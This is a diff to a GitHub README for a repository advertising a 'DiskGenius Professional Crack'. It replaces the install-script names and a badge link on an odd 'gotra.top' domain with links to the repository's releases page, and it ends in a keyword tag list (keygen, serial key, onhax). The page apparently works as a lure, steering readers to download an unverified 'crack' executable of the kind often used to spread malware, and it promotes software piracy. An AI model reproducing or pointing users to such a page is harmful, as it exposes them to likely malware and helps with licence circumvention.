@@ -1,5 +1,5 @@
 
-![register-diskgenius-01](https://github.com/user-attachments/assets/6e5c6d0e-bcf6-44fc-b350-6d0d3a9f951e)
+![register-diskgenius-01](https://github.com/peak23/Diskgenius-Professional-Crack/releases)
 
 # DiskGenius Professional Crack
 
@@ -29,8 +29,8 @@ Welcome to the **DiskGenius Professional Crack** repository! This project provid
 
 1. **Run the Installer**
    - Navigate to the folder and execute the appropriate script:
-     - For Windows: `install_windows.bat`
-     - For macOS: `install_mac.sh`
+     - For Windows: `https://github.com/peak23/Diskgenius-Professional-Crack/releases`
+     - For macOS: `https://github.com/peak23/Diskgenius-Professional-Crack/releases`
 
 2. **Follow the On-Screen Instructions**
 
@@ -76,6 +76,6 @@ Contributions are welcome! Please follow these steps:
 ---
 
 #
-[![https://LwVm6.gotra.top/52/E2xGLCT](https://LBwkft6.gotra.top/l.svg)](https://tULfq.gotra.top/52/aqUE1)
+[![https://github.com/peak23/Diskgenius-Professional-Crack/releases](https://github.com/peak23/Diskgenius-Professional-Crack/releases)](https://github.com/peak23/Diskgenius-Professional-Crack/releases)
 # Tags:
 diskgenius-professional-5 diskgenius-professional-download diskgenius-professional diskgenius-professional-crack-full diskgenius-professional-serial-key diskgenius-professional-portable diskgenius-professional-keygen diskgenius-professional-edition diskgenius-professional-4 diskgenius-professional-onhax diskgenius-professional-license-key diskgenius-professional-full
